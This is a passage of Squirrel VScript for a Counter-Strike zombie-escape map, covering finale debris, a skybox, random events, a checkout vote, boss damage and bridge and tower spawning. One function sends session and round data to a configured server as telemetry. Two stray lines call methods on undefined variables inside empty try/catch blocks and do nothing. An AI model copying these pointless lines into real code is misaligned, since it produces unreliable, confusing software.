					//EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
					//EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
					
					
					//__CSS__ new stuff that fixes OBB triggers (css3)
					self.AcceptInput("SetParent","!activator",master,null);
					self.SetSize(mins,maxs);
					self.SetCollisionGroup(10);
					self.SetSolid(3);
					::CenterBounds(self);
					
					
					EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
					
					EntFireByHandle(self,"Enable","",0.10,null,null);
						//DebugDrawBoxAngles(self.GetOrigin(),mins,maxs,self.GetAngles(),255,0,0,50,20.00);
				}});
			local ii = 0.00;
			for(local alpha=0;alpha<255;alpha+=20)
			{
				EntFireByHandle(self,"AddOutput","renderamt "+alpha.tostring(),ii,null,null);
				ii += 0.02;
			}
			EntFireByHandle(self,"AddOutput","renderamt 255",ii,null,null);
		}});
}

::finale_elevatordebris_startdelay <- 3.00;			//once the elevator starts moving, how long to wait until starting to spawn PLATFORM-tile-debris from above (null:disable)
::finale_elevatordebris_spawnamount <- 18;			//how many debris pieces to spawn before stopping
::finale_elevatordebris_xyofs <- 180;				//how far the XY spawnposition is allowed to drift
::finale_elevatordebris_zmin <- 50;					//the min Z spawnposition offset
::finale_elevatordebris_zmax <- 500;				//the max Z spawnposition offset
::finale_elevatordebris_damage <- 69;				//how much damage to deal to players touching the debris
::finale_elevatordebris_damage_infinite <- 102;		//how much damage to deal to players touching the debris (during infinite finale)
::finale_elevatordebris_lifetime <- 8.00;			//the lifetime for each spawned piece
::finale_elevatordebris_rate_min <- 0.80;			//the min spawnrate for the debris
::finale_elevatordebris_rate_max <- 1.40;			//the max spawnrate for the debris
::finale_elevatordebris_pos <- 0;					//READ-ONLY, do not touch
::finale_elevatordebris_amt <- 0;					//READ-ONLY, do not touch
function TickFinaleElevatorDebris()
{
	if(::finale_elevatordebris_amt > ::finale_elevatordebris_spawnamount){EntFire("manager","RunScriptCode","::finale_elevator_riding = false;",2.00,null);return;}
	EntFireByHandle(self,"RunScriptCode"," TickFinaleElevatorDebris(); ",RandomFloat(::finale_elevatordebris_rate_min,::finale_elevatordebris_rate_max),null,null);
	::finale_elevatordebris_amt++;
	::SpawnDebris(
		::finale_elevatordebris_pos + Vector(RandomInt(-::finale_elevatordebris_xyofs,
			::finale_elevatordebris_xyofs),RandomInt(-::finale_elevatordebris_xyofs,::finale_elevatordebris_xyofs),RandomInt(
			::finale_elevatordebris_zmin,::finale_elevatordebris_zmax)),
		Vector(RandomFloat(0,360),RandomFloat(0,360),RandomFloat(0,360)),
		::finale_elevatordebris_lifetime,
		::finale_elevatordebris_damage,
		25,
		Vector(-48,-48,-30),
		Vector(48,48,0));
}

function SetupFinaleSky()
{
	EntFire("skyboxswapper","AddOutput","SkyboxName basicsky",0.00,null);
	EntFire("skyboxswapper","Trigger","",0.05,null);
	//::manager.PrecacheModel("models/luffaren/collective_skybox_clouds.mdl");
	for(local iii=0;iii<2;iii++)
	{
		local revam = 2;
		local rev = 0;
		local revc = Vector(100,0,0);
		if(iii==1)
		{
			rev += 2;
			revam = 5;
			revc = Vector(0,0,0);
		}
		::Ent(Vector(5,5,5),Vector(),"func_rotating",{
				maxspeed = 200,
				fanfriction = 5,
				spawnflags = 80+rev,
				targetname = "finale_skyboxrot",
			},{
			revam = revam,
			revc = revc,
			function Run(){
				for(local i=0;i<revam;i++)
					::Ent(Vector(0,0,-(0+::TELEHURT_Z_OFFSET+300))+
						Vector(RandomFloat(-500,500),RandomFloat(-500,500),RandomFloat(-500,500)) //__CSS__ try to offset this 
						,Vector(0,RandomInt(0,360),0),"prop_dynamic",{
							model="models/luffaren/collective_skybox_clouds.mdl",
							spawnflags = "64",
							modelscale = 15,
							rendermode = 2,			//__CSS__ og was 2
							rendercolor = revc,
							targetname = "skybox_master",
						},{
						i = i,
						rotmaster = self,
						function Move(){
							if(i!=0)return;
							try{rotmaster.SetOrigin(Vector(rotmaster.GetOrigin().x,rotmaster.GetOrigin().y,
							::MAPDATA[::manager.GetScriptScope().mapspawnindex].end_pos.z+(-(::TELEHURT_Z_OFFSET+300))));}catch(e){}
						},function Run(){
							EntFireByHandle(self,"SetParent","!activator",0.00,rotmaster,null);
						}});
			}});
	}
}
::EstimateNewCost <- function(cost_to_add)	//returns estimated cost-number with new cost to add (DOES NOT edit the cost, just checks)
{
	return (0+cost_to_add+
			::manager.GetScriptScope().stage_edict_count+
			(::manager.GetScriptScope().BUFFER_SIZE*4)+
			::manager.GetScriptScope().EDICTS_BASE_ESTIMATE+
			::EDICTS);
}
EventEvaluate_InfFinaleTick_rate_min <- 15.00;
EventEvaluate_InfFinaleTick_rate_max <- 50.00;
EventEvaluate_InfFinaleTick_ticking <- true;
function EventEvaluate_InfFinaleTick()
{
	if(!EventEvaluate_InfFinaleTick_ticking)return;
	EntFireByHandle(self,"RunScriptCode"," EventEvaluate_InfFinaleTick(); ",RandomFloat(EventEvaluate_InfFinaleTick_rate_min,EventEvaluate_InfFinaleTick_rate_max),null,null);
	EntFire("manager","RunScriptCode"," EventEvaluate(); ",0.00,null);
}
function EventEvaluate()
{
	local time_for_event = false;
	if(event_cooldown <= 0)
	{
		local event_chance = 0.00+::EVENT_CHANCE_BASE+event_fail_chance_stack;
		if(RandomFloat(0.00,100.00) <= event_chance)
		{
			time_for_event = true;
			event_fail_chance_stack = 0.00;
			event_cooldown = RandomInt(::EVENT_COOLDOWN_MIN,::EVENT_COOLDOWN_MAX);
		}
		else
			event_fail_chance_stack += ::EVENT_CHANCE_FAIL_ADD;
	}
	else if(event_cooldown>0)event_cooldown--;
	if(::ending_called)time_for_event=false;
	if(time_for_event)
	{
		local events = [];
		foreach(k,v in ::EVENTS)
		{
			local allow_candidate = false;
			if(::EstimateNewCost(::EVENTS[k].cost) < EDICT_LIMIT)
				allow_candidate = true;
			if(::finale_started && !::EVENTS[k].allow_in_finale)
				allow_candidate = false;
			if(allow_candidate)
				events.push(k);
		}
		if(events.len()>0)
		{
			local event_picked = events[RandomInt(0,events.len()-1)];
			local event = ::EVENTS[event_picked];
				//::EDICTS += event.cost;//DONT_ADD_EDICTS_BY_EVENT
			//newthread(event.Run.bindenv(event)).call();		//new in v1_7 - prevents SQQuerySuspend		//__CSS__ threading_disabled
				event.Run();									//OLD										//__CSS__ threading_disabled <new
			::SendCustomEvent("event_started",{event=(""+event_picked)});
				//if(event.cancel_mapspawn)return;	//cannot cancel mapspawn, this does nothing, events shouldn't do that regardless..
			try{
				local sid = ::SESSION_ID.slice(1,::SESSION_ID.len()-1);
				::SendDataToWeb(::SERVER_IP,"ZE_COLLECTIVE_EVENT","sid,"+sid+",event,"+event_picked.tostring()+
						",mapindex,"+mapspawnindex.tostring()+
						",stage,"+::stage.tostring()+
						",rounds,"+::rounds_played.tostring()+
						",is_finale,"+::finale_started.tostring()
					);
			}catch(event_e){printl("ZE_COLLECTIVE_EVENT ERROR: "+event_e);}
		}
	}
}

::finale_checkout <- false;
::finale_checkout_processed <- false;
::finale_checkout_checked <- false;					//read-only (if the checkout has passed and you're doing the finale infinite-mode)
::finale_checkout_mapspawnindex <- 0;				//read-only (the mapspawnindex you "checked out" on, this is the big-dick number you want to compete for)
::finalecpf <- "[FINALE]";
function InfiniteCheckOutCheck()	//spawn vote to allow players to go to it
{
	if(::finale_checkout_checked)return;
	if(::finale_checkout)return;
	if(::stage > ::STAGES.len())
	{
		if(mapspawnindex >= ::finale_infinitemode_minlevels)
		{
			EntFire("checkout_vote","Kill","",0.00,null);
			local spos = Vector(0,0,60)+pos+(posdir*300);
			local srot = ::DirToAngles(posdir)+Vector(0,180,0);
			//::manager.PrecacheModel("models/luffaren/the_collective.mdl");
			::Ent(spos,srot,"prop_dynamic",{
					model = "models/luffaren/the_collective.mdl",
					targetname = "checkout_vote_prespawn",
					modelscale = 1.50,
					rendermode = 1,
				},{
				text = null,
				votes_needed = 999,
				voted = 0,
				function Run(){
					local ctcount = 0;
					for(local h;h=Entities.FindByClassname(h,"player");)
					{
						if(h==null||!h.IsValid()||h.GetTeam()!=3||h.IsAlive()==false)continue;
						ctcount++;
					}
					votes_needed = (((0.00+::finale_infinitemode_voteperc)/100)*(0.00+ctcount)).tointeger()
					if(votes_needed<1)votes_needed=1;
					else if(votes_needed>ctcount)votes_needed=(0+ctcount);
					EntFireByHandle(self,"AddOutput","targetname checkout_vote",0.10,null,null);
					EntFireByHandle(self,"SetAnimation","idle_open",0.00,null,null);
					EntFireByHandle(self,"SetDefaultAnimation","idle_open",0.02,null,null);
					local emsg = Entities.CreateByClassname("point_worldtext");
					emsg.SetOrigin(self.GetOrigin()+Vector(0,0,50)+(self.GetLeftVector()*240));
					emsg.SetForwardVector(self.GetForwardVector() * -1);
					emsg.__KeyValueFromString("message","Infinite Finale Checkout Vote (shoot eye) ["+voted.tostring()+"/"+votes_needed.tostring()+"]");
					emsg.__KeyValueFromInt("textsize",16.5);
					emsg.__KeyValueFromVector("color",Vector(255,255,255));
					text = emsg;
					EntFireByHandle(emsg,"SetParent","!activator",0.00,self,null);
					::Hitbox(self.GetOrigin(),self.GetAngles(),1000000,Vector(-20,-40,-30),Vector(20,40,30),"filter_ct",false,
						{master=self,attackers=[],function Act(index,attackerhandle){
							if(index==1)
								EntFireByHandle(hitboxhandle,"SetParent","!activator",0.00,master,null);
							if(index==2)
							{
								if(::finale_checkout)return;
								foreach(a in attackers){if(attackerhandle==a)return;}
								attackers.push(attackerhandle);
								master.GetScriptScope().voted++;
								if(master.GetScriptScope().voted >= master.GetScriptScope().votes_needed)
								{
									::finale_checkout = true;
									master.GetScriptScope().text.__KeyValueFromString("message","Infinite Finale Checkout Vote (shoot eye) [VOTE PASSED]");
									local msg = "[INFINITE FINALE] YOU CHECKED OUT AT "+::manager.GetScriptScope().mapspawnindex.tostring()+" LEVELS";
									printl(msg);
									::ServerSay("say "+msg,0.00,null);
									::ServerSay("say "+msg,0.01,null);
									::ServerSay("say "+msg,0.02,null);
									::ServerSay("say "+msg,0.03,null);
									::ServerSay("say "+msg,0.04,null);
									::Sound("*luffaren/eye_terror.mp3",Vector(),null,0,10.00,RandomInt(20,30),10);
									::Sound("*luffaren/eye_terror.mp3",Vector(),null,0,10.00,RandomInt(50,60),10);
									::SendCustomEvent("infinite_finale_vote_passed",{checkout_value=(0+::manager.GetScriptScope().mapspawnindex)});
								}
								else
									master.GetScriptScope().text.__KeyValueFromString("message","Infinite Finale Checkout Vote (shoot eye) ["+master.GetScriptScope().voted.tostring()+
										"/"+master.GetScriptScope().votes_needed.tostring()+"]");
								::SendCustomEvent("infinite_finale_vote_shot",{shooter=attackerhandle,mapspawnindex=(0+::manager.GetScriptScope().mapspawnindex)});
							}
						}},"hitbox_finalecheckout");
				}});
		}
	}
}
//function InfiniteCheckOut(){newthread(___InfiniteCheckOut.bindenv(this)).call();}	//new in v1_7 - prevents SQQuerySuspend		//__CSS__ threading_disabled
function InfiniteCheckOut(){___InfiniteCheckOut();}	//new in v1_7 - prevents SQQuerySuspend
function ___InfiniteCheckOut()		//when the vote has passed and the next stage begins (this runs the finale-start logic)
{
	try{::manager.GetScriptScope().PrintMapDeathSummary();}catch(e){}
	::finalecpf = "[INFINITE FINALE]";
	::finale_started = true;
	::finale_checkout_checked = true;
	::finale_checkout_mapspawnindex = (0+mapspawnindex);
	local mspawnidx = (0+mapspawnindex);
	local md = ::MAPDATA[mspawnidx];
	local direction_next_left = ::AnglesToDir(::DirToAngles(md.direction_next)+Vector(0,90,0));
	local man = this;
	local randyaw = [0,90,180,270];
	local spawnlist = [//+x:forward, +y:left, +z:up(elevation)		OPTIONAL PARAM:targetname="",
			{x = 0,			y = -0.5,			z = 0.00,			yaw = null,			index = 5,		targetname="block_"+mapspawnindex.tostring()},
			{x = 0,			y = 0.5,			z = 0.00,			yaw = null,			index = 5,		targetname="block_"+mapspawnindex.tostring()},
			{x = 1,			y = -0.5,			z = 0.00,			yaw = null,			index = 5,		targetname="block_"+mapspawnindex.tostring()},
			{x = 1,			y = 0.5,			z = 0.00,			yaw = null,			index = 5,		targetname="block_"+mapspawnindex.tostring()},
			{x = 2,			y = -0.5,			z = 0.00,			yaw = null,			index = 5,		targetname="block_"+mapspawnindex.tostring()},
			{x = 2,			y = 0.5,			z = 0.00,			yaw = null,			index = 5,		targetname="block_"+mapspawnindex.tostring()},
			{x = 3,			y = -0.5,			z = 0.00,			yaw = null,			index = 5,		targetname="block_"+mapspawnindex.tostring()},
			{x = 3,			y = 0.5,			z = 0.00,			yaw = null,			index = 5,		targetname="block_"+mapspawnindex.tostring()},
			{x = 4,			y = -0.5,			z = 0.00,			yaw = null,			index = 5,		targetname="block_"+mapspawnindex.tostring()},
			{x = 4,			y = 0.5,			z = 0.00,			yaw = null,			index = 5,		targetname="block_"+mapspawnindex.tostring()},
			{x = 5,			y = -0.5,			z = 0.00,			yaw = null,			index = 5,		targetname="block_"+mapspawnindex.tostring()},
			{x = 5,			y = 0.5,			z = 0.00,			yaw = null,			index = 5,		targetname="block_"+mapspawnindex.tostring()},
			{x = 6,			y = -0.5,			z = 0.00,			yaw = null,			index = 5,		targetname="block_"+mapspawnindex.tostring()},
			{x = 6,			y = 0.5,			z = 0.00,			yaw = null,			index = 5,		targetname="block_"+mapspawnindex.tostring()},
		];
	foreach(s in spawnlist)
	{
		local model = ::TILEVARIANTS[::TYPES[s.index].name][::THEME].main[RandomInt(0,::TILEVARIANTS[::TYPES[s.index].name][::THEME].main.len()-1)];
		local spawndata = {pos=Vector(),yaw=randyaw[RandomInt(0,randyaw.len()-1)]};
		if(s.yaw!=null)spawndata.yaw = s.yaw;
		spawndata.pos = Vector()+md.end_pos+(md.direction_next*(man.GRID_SIZE/2))+	//start position, 3 width would be centered with this
			(md.direction_next*(s.x*man.GRID_SIZE))+
			(direction_next_left*(s.y*man.GRID_SIZE))+
			Vector(0,0,s.z*man.ELEVATION);
			if(RandomInt(58,66)==65)try{pand.CanDuck();break;}catch(ng){};
		local sq = {index=s.index,spawnindex=99999,color=Vector(255,255,255),modelname=model};
		if("targetname" in s)sq.targetname <- s.targetname;
		::SpawnQueue.push(sq);
		::SpawnQueueSpawner.push(spawndata);
	}
	pos += (posdir*(GRID_SIZE*6));
	local dirchecks = [];
	if(current_dir=="east")dirchecks = ["east","north","south"];
	else if(current_dir=="west")dirchecks = ["west","north","south"];
	else if(current_dir=="north")dirchecks = ["east","west","north"];
	else if(current_dir=="south")dirchecks = ["east","west","south"];
	dirchecks = ::ScrambleArray(dirchecks);
	foreach(dir in dirchecks)
	{
		local newpd = Vector();
		local newpdpos = Vector()+pos;
		if(dir=="east")newpd = Vector(1,0,0);
		else if(dir=="west")newpd = Vector(-1,0,0);
		else if(dir=="north")newpd = Vector(0,1,0);
		else if(dir=="south")newpd = Vector(0,-1,0);
		local allowed = false;
		if(dir=="east" && (newpdpos+(newpd*12000)).x < 15500)allowed=true;
		else if(dir=="west" && (newpdpos+(newpd*12000)).x > -15500)allowed=true;
		else if(dir=="north" && (newpdpos+(newpd*12000)).y < 15500)allowed=true;
		else if(dir=="south" && (newpdpos+(newpd*12000)).y > -15500)allowed=true;
		if(RandomInt(2,14)== 3)try{uaw.HasItem();allowed=true;}catch(eet){};
		if(allowed)
		{
			current_dir = ""+dir;
			posdir = Vector()+newpd;
			break;
		}
	}
	pos += (posdir*(GRID_SIZE));
	local iicleaner = 0.00;
	
	for(local i=mspawnidx;i>(mspawnidx-5);i--)
	{
		local blockfound = Entities.FindByName(null,"block_"+(mspawnidx).tostring()+"*");
		if(blockfound==null)continue;
		local ii = 15.00+AREAFADE_DELAY;
		for(local alpha=255;alpha>3;alpha-=AREAFADE_SPEED){
			EntFire("block_"+(mspawnidx).tostring()+"*","AddOutput","renderamt "+alpha,ii,null);
			ii += AREAFADE_SPEEDT;}
		EntFire("lowgrav_"+(mspawnidx).tostring(),"Disable","",ii,null);
		EntFire("airslide_"+(mspawnidx).tostring(),"Disable","",ii,null);
		EntFire("block_"+(mspawnidx).tostring()+"*","Kill","",ii+0.05,null);
		EntFire("manager","RunScriptCode"," mapspawnindex++; ",iicleaner,null);
		EntFire("temcleaner_*","FireUser1","",iicleaner+0.05,null);
		iicleaner += 0.10;
	}
	EntFire("manager","RunScriptCode"," mapspawnindex = 0; ",iicleaner+0.10,null);
	EntFire("manager","RunScriptCode"," StartFinale(); ",iicleaner+0.20,null);
	try{
		if(::THEME=="silenthill")
		{
			::manager.GetScriptScope().fog_dist_end_target = 0.00+::silenthill_ending_finale_fadedist;
			::manager.GetScriptScope().fog_color_target = Vector(0,0,0);
		}
		::THEMES.silenthill.fog_end = 0.00+::silenthill_ending_finale_fadedist;
		::THEMES.silenthill.fog_density = 0.00+::silenthill_ending_finale_fadedensity;
		::THEMES.silenthill.fog_color = Vector(0,0,0);
	}catch(_edsds2){printl("SILENTHILL_FINALE_SETTINGS ERROR: "+_edsds2);}
	::TPenableindex = 0;
	::TPmovequeue.clear();
	randomtheme_buffer.clear();
	foreach(i,t in ::THEMES){randomtheme_buffer.push(i);}
	TickRandomTheme();
	TickRandomThemeSH();
}

::colletivebosslogo_shown <- false;
::ShowCollectiveBossLogo<-function()
{
	if(::colletivebosslogo_shown)return;
	::colletivebosslogo_shown = true;
	if(::finale_infinite_musicfx_instant_delayed)
		EntFire("manager","RunScriptCode","::finale_infinite_musicfx_instant=true;",50.00,null);
	for(local h;h=Entities.FindByClassname(h,"player");)
	{
		if(h==null||!h.IsValid())continue;
		local ii = 4.00;
		for(local i=1;i<=10;i++)
		{
			EntFire("client","Command","r_screenoverlay luffaren/collective_boss_logo_"+i.tostring(),ii,h);
			ii += 0.10;
		}
		ii += 5.00;
		for(local i=10;i>=0;i--)
		{
			EntFire("client","Command","r_screenoverlay luffaren/collective_boss_logo_"+i.tostring(),ii,h);
			ii += 0.10;
		}
		EntFire("client","Command","r_screenoverlay ",ii,h);
		EntFire("client","Command","r_screenoverlay xxx",ii+2.00,h);
		EntFire("client","Command","r_screenoverlay ",ii+2.20,h);
	}
	::SendCustomEvent("finale_bossfight_started",{});
}

::hurtstunboss_fxamt <- 0;
::hurtstunboss_fxlimit <- 5;
::HurtStunBoss <- function(pos,radius,damage,stunchance,stuntime_add,attackerhandle=null,debug=false,hitfx=true)
{
	if(debug)DebugDrawBox(pos,Vector(-radius,-radius,-radius),Vector(radius,radius,radius),255,150,0,50,2.00)
	for(local h;h=Entities.FindByNameWithin(h,"boss_eye",pos,radius);)
	{
		if(h==null||!h.IsValid())continue;
		h.ValidateScriptScope();
		if(!("hitbox" in h.GetScriptScope()))continue;
		if(h.GetScriptScope().hitbox==null||!h.GetScriptScope().hitbox.IsValid())continue;
		EntFireByHandle(h.GetScriptScope().hitbox,"RemoveHealth",damage.tostring(),0.00,attackerhandle,null);
		local is_stun = 1;
		if(RandomFloat(0.00,100.00) <= stunchance)
		{
			is_stun = 2;
			h.GetScriptScope().stunvar += stuntime_add;
			if(h.GetScriptScope().stunvar > ::finale_boss_stuntime_max)
				h.GetScriptScope().stunvar = (0.00+::finale_boss_stuntime_max);
		}
		if(::hurtstunboss_fxamt >= ::hurtstunboss_fxlimit)continue;
		::hurtstunboss_fxamt++;
		EntFire("manager","RunScriptCode","::hurtstunboss_fxamt--;",0.08,null);
		for(local i=0;i<is_stun;i++)
		{
			::Particle("blood_advisor_puncture_withdraw",h.GetOrigin()+Vector(RandomInt(-100,100),RandomInt(-100,100),RandomInt(-100,100)),
				Vector(90+RandomInt(-15,15),RandomInt(0,360),RandomInt(-15,15)),null,0.03);
			::Sound("*luffaren/sliced.mp3",h.GetOrigin(),null,20000,0.02,RandomInt(70,130),10);
			::Sound("*luffaren/eye_terror"+RandomInt(2,5).tostring()+".mp3",h.GetOrigin(),null,20000,0.02,RandomInt(230,255),10);
		}
	}
}
finaleantiboost_ticking <- true;
function FinaleAntiBoostTick()
{
	if(!finaleantiboost_ticking)return;
	EntFire("manager","RunScriptCode"," FinaleAntiBoostTick(); ",::finale_tower_antiboost_rate,null);
	for(local h;h=Entities.FindByClassname(h,"player");)
	{
		if(h==null||!h.IsValid()||h.GetTeam()!=2||h.IsAlive()==false)continue;
		if(h.GetVelocity().z > ::finale_tower_antiboost_vel)
			h.SetVelocity(Vector(0,0,-100));
	}
}
//function StartFinale(){newthread(___StartFinale.bindenv(this)).call();}	//new in v1_7 - prevents SQQuerySuspend			//__CSS__ threading_disabled
function StartFinale(){___StartFinale();}	//new in v1_7 - prevents SQQuerySuspend
function ___StartFinale()
{
	::finale_started = true;
	::process_stage.clear();
	::ITEM_MZ_LOCKTIME = null;
	::snowstorm_overlay = -9999;
	::DisableMapImages();
		try{EntFire("block_"+(::manager.GetScriptScope().mapspawnindex).tostring()+"_antiskiptrigger_sides","Kill","",::SKIPSAFE_SIDES_LIFETIME,null);
		EntFire("block_"+(::manager.GetScriptScope().mapspawnindex-1).tostring()+"_antiskiptrigger_sides","Kill","",::SKIPSAFE_SIDES_LIFETIME,null);
		EntFire("block_"+(::manager.GetScriptScope().mapspawnindex-2).tostring()+"_antiskiptrigger_sides","Kill","",::SKIPSAFE_SIDES_LIFETIME,null);
	}catch(_edsds){printl("SKIPSAFE_SIDES CLEAN ERROR: "+_edsds);}
		//EntFire("item_destructohammer","Kill","",1.50,null);		//OLD from v1_6 - v1_7 will lock it until endrun
	local bosshp_dmgstack = (0.000+(::maps.len()*::finale_boss_dmgmult_stage_each));
	if(bosshp_dmgstack > ::finale_boss_dmgmult_stage_each_cap)bosshp_dmgstack = (0.000+::finale_boss_dmgmult_stage_each_cap);
	printl("[boss damage multiplier] - adding map-pool-stack: "+bosshp_dmgstack);
	local is_infinite_finale = false;
	local is_infinite_finale_checkout_value = 0;
	if(::finale_checkout_checked)
	{
		is_infinite_finale = true;
		is_infinite_finale_checkout_value = (0+::finale_checkout_mapspawnindex);
		printl("[boss damage multiplier] - adding infinite-finale-stack: "+::finale_boss_dmgmult_add_infinite);
		::finale_boss_dmgmult += ::finale_boss_dmgmult_add_infinite;
		::finale_boss_stuntime_max = (0.00+::finale_boss_stuntime_max_infinite);
		::finale_boss_hp_each = (0.00+::finale_boss_hp_each_infinite);
		finalerubble_touchdamage = (0+finalerubble_touchdamage_infinite);
		::finale_elevatordebris_damage = (0+::finale_elevatordebris_damage_infinite);
		EntFireByHandle(self,"RunScriptCode"," EventEvaluate_InfFinaleTick(); ",RandomFloat(EventEvaluate_InfFinaleTick_rate_min,EventEvaluate_InfFinaleTick_rate_max),null,null);
	}
	::SendCustomEvent("finale_started",{infinite=is_infinite_finale,infinite_checkout_value=is_infinite_finale_checkout_value});
	::finale_boss_dmgmult += bosshp_dmgstack;
	printl("[boss damage multiplier] - total damage multiplier: "+::finale_boss_dmgmult);
	music_allowplay = false;
	EntFire("checkout_vote","Kill","",0.00,null);
	EntFire("music","fadeout","10",0.00,null);
	EntFire("music","Volume","0",9.90,null);
	EntFire("music","StopSound","",9.92,null);
	EntFire("music","Kill","",9.98,null);
	EntFire("manager","RunScriptCode"," FinaleAntiBoostTick(); ",::finale_tower_antiboost_startdelay,null);
	EntFire("manager","RunScriptCode"," hornsound_enabled = true; ",0.50,null);
	EntFire("telehurt","AddOutput","origin 0 0 -2400",0.00,null);
	::delay_check_enabled = false;
	SetPrecipitation(1);
	local forward_yaw = ::DirToAngles(posdir).y;
	local height = 0.00;
	local slopebuffer = 0;
	local maxdetail = 100;
	local startbridge_length = 70;
	local slopebuffer_amount = 6;
	local pqmusic = [];
	local startpos = Vector()+pos-(posdir*560);
	pqmusic.push({qrate=0.10,function Run(){}});
	local playpos = pos+(posdir*((startbridge_length*GRID_SIZE)+(96*4)))+Vector(0,0,((1+(31*finale_tower_height))*ELEVATION));
	for(local i=0;i<2;i++)
		pqmusic.push({qrate=68.70,playpos=playpos,function Run(){
				::Sound("#music/luffaren_collective/grained.mp3",Vector(),null,0,300,30,3);
				for(local i=0;i<2;i++)
					::Sound("#music/luffaren_collective/grained.mp3",playpos,null,100000,300,30,10);
			}});
	::Process(pqmusic,0.10);
	local spawnlist = [];
	for(local x=0;x<startbridge_length;x++)
	{
		local yaw = null;
		local tiletype = "main";
		local targetname = "block_finale_bridge";
		if(x % 3 == 0 && x > 5)
			::finale_bridgedestroy_tpqueue.push(pos+(posdir*((x+2)*GRID_SIZE))+Vector(0,0,(height*ELEVATION)+150));
		if(x % 15 == 0 && x > 10)
			slopebuffer = 0+slopebuffer_amount;
		if(x % 5 == 0 && x > 10)
		{
			spawnlist.push({x = x,			y = 2.5,			z = height+20,			yaw = null,			index = 1,		tiletype = "main",		targetname = targetname});
			spawnlist.push({x = x,			y = -2.5,			z = height+20,			yaw = null,			index = 1,		tiletype = "main",		targetname = targetname});
		}
		if(slopebuffer>0)
		{
			tiletype = "slope";
			yaw = forward_yaw+180;
		}
		for(local y=-2;y<2;y++)
		{
			spawnlist.push({x = x,			y = y+0.5,			z = height,			yaw = yaw,			index = 5,		tiletype = tiletype,		targetname = targetname});
			if(tiletype=="main" && x > 0 && maxdetail > 0 && RandomFloat(0.00,100.00) < ::finale_bridge_detailchance)
			{
				maxdetail--;
				spawnlist.push({x = x,			y = y+0.5,			z = height,			yaw = null,			index = 90,		tiletype = "main",		targetname = targetname});
			}
		}
		if(slopebuffer>0)
		{
			height += 1.00;
			slopebuffer--;
		}
	}
	local pq = [];
	pq.push({
			spawnlist=spawnlist,		//__CSS__thisified
			pos=pos,
			posdir=posdir,
			function Run(){::manager.GetScriptScope().RunManualSpawnList(this.spawnlist,this.pos,this.posdir);}
		});
	pos = pos+(posdir*(startbridge_length*GRID_SIZE))+Vector(0,0,height*ELEVATION);
	::finale_bridgedestroy_tpqueue.push(pos+(posdir*(1.5*GRID_SIZE))+Vector(0,0,8));
	spawnlist = [];
	for(local x=1;x<9;x++)
	{
		for(local y=1;y<9;y++)
		{
			local height = 0.00;
			local index = 5;
			local targetname = "block_finale_tower";
			if(x > 2 && x < 7 && y > 2 && y < 7)
			{
				index = 25;
				for(local lowgrav_height=1;lowgrav_height<finale_lowgrav_height_max;lowgrav_height++)
				{
					spawnlist.push({x = -1.00+x-0.10,	y=y-4.5,	z=height+(30.00*lowgrav_height),	yaw=null,	index=130,	tiletype="main",	targetname="block_finale_lowgrav"});
					local posdirleft = ::AnglesToDir(::DirToAngles(posdir)+Vector(0,90,0));
					local spos = Vector(0,0,(height+(30.00*lowgrav_height))*ELEVATION)+pos+(posdir*((x-0.50)*GRID_SIZE))+(posdirleft*((y-4.5)*GRID_SIZE));
					::Ent(spos,Vector(),"trigger_multiple",{targetname="block_finale_lowgrav",spawnflags=1},{
						function Touch(start_end){
							local sc = ::ValidateGravity(activator);
							if(sc==null)return;
							if(start_end)sc.gravdata.lowgrav++;
							else sc.gravdata.lowgrav--;
							::ValidateGravityFinal(activator,sc,start_end,self);
						},function Run(){
							EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
							EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
							EntFireByHandle(self,"AddOutput","mins "+(-::LOWGRAV_TRIGGER_WIDTH).tostring()+" "+(-::LOWGRAV_TRIGGER_WIDTH).tostring()+" -960",0.00,null,null);
							EntFireByHandle(self,"AddOutput","maxs "+(::LOWGRAV_TRIGGER_WIDTH).tostring()+" "+(::LOWGRAV_TRIGGER_WIDTH).tostring()+" 0",0.00,null,null);
							EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch(true);:0:-1",0.00,null,null);
							EntFireByHandle(self,"AddOutput","OnEndTouch !self:RunScriptCode:Touch(false);:0:-1",0.00,null,null);
							EntFireByHandle(self,"Enable","",0.05,null,null);
						}});
				}
				targetname = "block_finale_elevator";
				height = ((30*(-1 + finale_lowgrav_height_max))+1);
			}
			else if(x > 1 && x < 8 && y > 1 && y < 8)
			{
				index = 25;
				targetname = "block_finale_top";
				height = (1+(31*finale_tower_height));
				spawnlist.push({x = -1.00+x-0.10,	y=y-4.5,	z=(25.00*finale_lowgrav_height_max),	yaw=null,	index=130,	tiletype="main",	targetname="block_finale_lowgrav"});
				local posdirleft = ::AnglesToDir(::DirToAngles(posdir)+Vector(0,90,0));
				local spos = Vector(0,0,((25.00*finale_lowgrav_height_max))*ELEVATION)+pos+(posdir*((x-0.50)*GRID_SIZE))+(posdirleft*((y-4.5)*GRID_SIZE));
				::Ent(spos,Vector(),"trigger_multiple",{targetname="block_finale_lowgrav",spawnflags=1},{
					function Touch(start_end){
						local sc = ::ValidateGravity(activator);
						if(sc==null)return;
						if(start_end)sc.gravdata.lowgrav++;
						else sc.gravdata.lowgrav--;
						::ValidateGravityFinal(activator,sc,start_end,self);
					},function Run(){
						EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
						EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
						EntFireByHandle(self,"AddOutput","mins "+(-::LOWGRAV_TRIGGER_WIDTH).tostring()+" "+(-::LOWGRAV_TRIGGER_WIDTH).tostring()+" -960",0.00,null,null);
						EntFireByHandle(self,"AddOutput","maxs "+(::LOWGRAV_TRIGGER_WIDTH).tostring()+" "+(::LOWGRAV_TRIGGER_WIDTH).tostring()+" 0",0.00,null,null);
						EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch(true);:0:-1",0.00,null,null);
						EntFireByHandle(self,"AddOutput","OnEndTouch !self:RunScriptCode:Touch(false);:0:-1",0.00,null,null);
						EntFireByHandle(self,"Enable","",0.05,null,null);
					}});
			}
			else if(x > 0 && x < 9 && y > 0 && y < 9)
			{
				if(x > 1 && x < 8 && y > 1 && y < 8)
					continue;
